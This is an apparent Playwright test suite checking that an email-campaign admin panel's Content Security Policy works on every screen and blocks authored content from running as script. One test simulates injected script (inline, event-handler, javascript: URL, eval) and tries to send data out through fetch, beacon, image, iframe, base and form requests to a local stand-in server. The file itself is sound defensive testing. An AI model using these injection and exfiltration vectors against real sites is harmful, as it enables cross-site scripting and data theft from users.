// The admin policy (D71) in the browser. Every test in this suite fails on a violation through
// helpers.js; this one walks every screen with real rows behind it, then shows what the policy is
// for: script that got onto the page anyway neither runs nor sends anything out. listmonk sets no
// policy at 6fcd95f, so it has no such spec.
import { createServer } from "node:http";
import { generateRuntimeFunction } from "@alpinejs/csp/src/parser.js";
import { expect } from "@playwright/test";
import { api, login, ORIGIN, test, unique } from "../helpers.js";

async function ok(page, path, method, body) {
  const response = await api(page, path, method, body);
  expect(response.status, JSON.stringify(response.body)).toBe(200);
  return response.body.data;
}

// Every directive on the page, inside templates too, which the test fixture's HTTP pass cannot see
// on the screens that need the production stack.
function directives() {
  const found = [];
  const walk = (root) => {
    for (const el of root.querySelectorAll("*")) {
      for (const { name, value } of el.attributes)
        if (/^(x-[a-z]|@|:)/.test(name) && !/^x-(cloak|ignore|transition)/.test(name))
          found.push([name, value]);
      if (el instanceof HTMLTemplateElement) walk(el.content);
    }
  };
  walk(document);
  return found;
}

test("every screen works under the policy", async ({ page }) => {
  test.setTimeout(120_000);
  await login(page);
  const list = await ok(page, "/api/lists", "POST", {
    name: unique("Policy"),
    type: "public",
    optin: "single",
    tags: ["policy"],
  });
  const subscriber = await ok(page, "/api/subscribers", "POST", {
    email: `${unique("policy")}@example.com`,
    name: "Policy",
    status: "enabled",
    lists: [list.id],
  });
  const template = await ok(page, "/api/templates", "POST", {
    name: unique("Policy"),
    type: "campaign",
    body: "<p>{{ content | raw }}</p>",
  });
  const campaign = await ok(page, "/api/campaigns", "POST", {
    name: unique("Policy"),
    subject: "Policy",
    type: "regular",
    content_type: "richtext",
    body: '<p style="color: red">Styled</p>',
    lists: [list.id],
  });

  const paths = [
    "/admin",
    "/admin/user/profile",
    "/admin/lists",
    "/admin/lists/new",
    `/admin/lists/${list.id}`,
    `/admin/lists/${list.id}/edit`,
    "/admin/lists/analytics",
    "/admin/lists/forms",
    "/admin/subscribers",
    "/admin/subscribers/new",
    `/admin/subscribers/lists/${list.id}`,
    `/admin/subscribers/${subscriber.id}`,
    `/admin/subscribers/${subscriber.id}/edit`,
    `/admin/subscribers/${subscriber.id}/lists`,
    `/admin/subscribers/${subscriber.id}/bounces`,
    `/admin/subscribers/${subscriber.id}/events`,
    `/admin/subscribers/${subscriber.id}/enrollments`,
    `/admin/subscribers/${subscriber.id}/sends`,
    "/admin/subscribers/import",
    "/admin/subscribers/bounces",
    "/admin/campaigns",
    "/admin/campaigns/new",
    `/admin/campaigns/${campaign.id}`,
    "/admin/campaigns/media",
    "/admin/campaigns/analytics",
    "/admin/templates",
    "/admin/templates/new",
    `/admin/templates/${template.id}`,
    "/admin/sequences",
    "/admin/sequences/new",
    "/admin/sequences/enrollments",
    "/admin/users",
    "/admin/users/new",
    "/admin/users/roles",
    "/admin/users/roles/new",
    "/admin/users/roles/lists",
    "/admin/users/roles/lists/new",
    "/admin/settings",
    "/admin/settings/logs",
    "/admin/settings/maintenance",
  ];
  for (const path of paths) {
    const response = await page.goto(path);
    expect(response.headers()["content-security-policy"], path).toContain("script-src 'self'");
    await page.waitForFunction(() => window.Alpine && document.body._x_dataStack);
    await page.waitForLoadState("networkidle");
    for (const [name, value] of await page.evaluate(directives)) {
      if (name === "x-ref" || !value) continue;
      const expression = name === "x-for" ? value.replace(/^.*?\s(?:in|of)\s/, "") : value;
      expect(() => generateRuntimeFunction(expression), `${path} ${name}="${value}"`).not.toThrow();
    }
  }

  // The frames: a preview's <style> survives the inherited policy, and the media picker opens.
  await page.goto(`/admin/campaigns/${campaign.id}#tab=content`);
  await page.getByRole("button", { name: "Preview" }).first().click();
  const frame = page.frameLocator(".preview-modal iframe");
  await expect(frame.locator("body")).toContainText("Styled");
});

test.describe("responses that hold authored text", () => {
  // Loads each address as a classic script on an admin page, as injected markup would.
  const asScript = (page, paths) =>
    page.evaluate(async (list) => {
      const outcomes = {};
      for (const path of list)
        outcomes[path] = await new Promise((resolve) => {
          const script = document.createElement("script");
          script.onload = () => resolve("ran");
          script.onerror = () => resolve("refused");
          script.src = path;
          document.head.append(script);
        });
      return { outcomes, ran: window.__authored ?? null };
    }, paths);

  test("do not run as same-origin script", async ({ page }) => {
    await login(page);
    const list = await ok(page, "/api/lists", "POST", {
      name: unique("Script"),
      type: "private",
      optin: "single",
    });
    const payload = 'window.__authored = (window.__authored || "") + "x";';
    const slug = unique("script");
    const archived = await ok(page, "/api/campaigns", "POST", {
      name: unique("Archived"),
      subject: "Script",
      type: "regular",
      content_type: "visual",
      template_id: null,
      archive: true,
      archive_slug: slug,
      body: payload,
      body_source: "{}",
      lists: [list.id],
    });
    await ok(page, `/api/campaigns/${archived.id}/status`, "PUT", { status: "running" });
    await expect.poll(async () => (await page.request.get(`/archive/${slug}`)).status()).toBe(200);
    const template = await ok(page, "/api/templates", "POST", {
      name: unique("Raw"),
      type: "campaign",
      body: "{{ content | raw }}",
    });
    const draft = async (content_type) =>
      ok(page, "/api/campaigns", "POST", {
        name: unique("Draft"),
        subject: "Script",
        type: "regular",
        content_type,
        template_id: template.id,
        body: payload,
        lists: [list.id],
      });
    const plain = await draft("plain");
    const html = await draft("html");
    const authored = [
      `/archive/${slug}`,
      `/api/campaigns/${plain.id}/preview`,
      `/api/campaigns/${html.id}/preview`,
    ];
    for (const path of authored) {
      const response = await page.request.get(path);
      expect([path, response.status(), await response.text()]).toEqual([path, 200, payload]);
    }

    await page.goto("/admin/lists");
    expect(await asScript(page, ["/admin/custom.js"])).toEqual({
      outcomes: { "/admin/custom.js": "ran" },
      ran: null,
    });
    expect(await asScript(page, authored)).toEqual({
      outcomes: Object.fromEntries(authored.map((path) => [path, "refused"])),
      ran: null,
    });
  });
});

test.describe("expressions rewritten for the CSP build", () => {
  test("a list missing a status shows 0, not NaN", async ({ page }) => {
    await login(page);
    const list = await ok(page, "/api/lists", "POST", {
      name: unique("Statuses"),
      type: "private",
      optin: "single",
    });
    await page.goto(`/admin/lists/${list.id}`);
    const stats = page.locator(".stat-card .stat-value");
    await expect(stats).toHaveText(["0", "0", "0", "0"]);
  });

  test("a bounce whose campaign has no name still shows the dash", async ({ page }) => {
    await login(page);
    const subscriber = await ok(page, "/api/subscribers", "POST", {
      email: `${unique("dash")}@example.com`,
      name: "Dash",
      status: "enabled",
      lists: [],
    });
    await page.route(`**/api/subscribers/${subscriber.id}/bounces`, (route) =>
      route.fulfill({
        json: {
          data: [
            {
              id: 1,
              type: "soft",
              source: "api",
              created_at: "2026-01-01T00:00:00Z",
              campaign: { id: 9, name: null },
            },
          ],
        },
      }),
    );
    await page.goto(`/admin/subscribers/${subscriber.id}/bounces`);
    await expect(page.getByTestId("bounce-row").locator("td").first()).toHaveText("-");
  });
});

test.describe("script that reached the page", () => {
  test.use({ violations: "expected" });
  let server;
  let remote;
  let requests;
  test.beforeAll(async () => {
    requests = [];
    server = createServer((request, response) => {
      requests.push(request.url);
      response.setHeader("Access-Control-Allow-Origin", "*");
      response.end("ok");
    });
    await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
    remote = `http://127.0.0.1:${server.address().port}`;
  });
  test.afterAll(() => new Promise((resolve) => server.close(resolve)));

  test("does not run, and cannot send anything out", async ({ page }) => {
    await login(page);
    await page.goto("/admin/lists");
    const outcome = await page.evaluate(async (target) => {
      const refused = [];
      document.addEventListener("securitypolicyviolation", (e) =>
        refused.push(e.effectiveDirective),
      );
      // Inline, handler, URL and eval forms: the ways markup injection or a gadget would start.
      const inline = document.createElement("script");
      inline.textContent = "window.__ran = 'inline'";
      document.head.append(inline);
      const handler = document.createElement("img");
      handler.setAttribute("onerror", "window.__ran = 'handler'");
      handler.src = "/missing.png";
      document.body.append(handler);
      const link = document.createElement("a");
      link.href = "javascript:window.__ran='url'";
      document.body.append(link);
      link.click();
      const external = document.createElement("script");
      external.src = `${target}/script.js`;
      document.head.append(external);
      // Every way out.
      const sent = [];
      await fetch(`${target}/fetch`, { mode: "no-cors" }).then(
        () => sent.push("fetch"),
        () => {},
      );
      const image = new Image();
      image.src = `${target}/image`;
      navigator.sendBeacon(`${target}/beacon`, "data");
      const style = document.createElement("link");
      style.rel = "stylesheet";
      style.href = `${target}/style.css`;
      document.head.append(style);
      const frame = document.createElement("iframe");
      frame.src = `${target}/frame`;
      document.body.append(frame);
      const base = document.createElement("base");
      base.href = `${target}/`;
      document.head.append(base);
      const form = document.createElement("form");
      form.method = "post";
      form.action = `${target}/form`;
      document.body.append(form);
      form.submit();
      await new Promise((resolve) => setTimeout(resolve, 300));
      // After a task: Playwright's own evaluation is exempt from the page's eval rule.
      let evaluated = "refused";
      try {
        evaluated = (0, eval)("1 + 1");
      } catch {
        // CSP throws EvalError.
      }
      let constructed = "refused";
      try {
        constructed = new Function("return 2")();
      } catch {
        // The same.
      }
      return { ran: window.__ran, evaluated, constructed, sent, refused, base: document.baseURI };
    }, remote);
    expect(outcome.ran).toBeUndefined();
    expect(outcome.evaluated).toBe("refused");
    expect(outcome.constructed).toBe("refused");
    expect(outcome.sent).toEqual([]);
    expect(outcome.base.startsWith(ORIGIN)).toBe(true);
    for (const directive of [
      "script-src-elem",
      "script-src-attr",
      "connect-src",
      "img-src",
      "style-src-elem",
      "frame-src",
      "base-uri",
      "form-action",
    ])
      expect(outcome.refused).toContain(directive);
    await page.waitForTimeout(200);
    expect(requests).toEqual([]);
  });

  test("the admin cannot be framed by another origin", async ({ page }) => {
    await login(page);
    const response = await page.goto("/admin/login");
    expect(response.headers()["content-security-policy"]).toContain("frame-ancestors 'self'");
  });
});
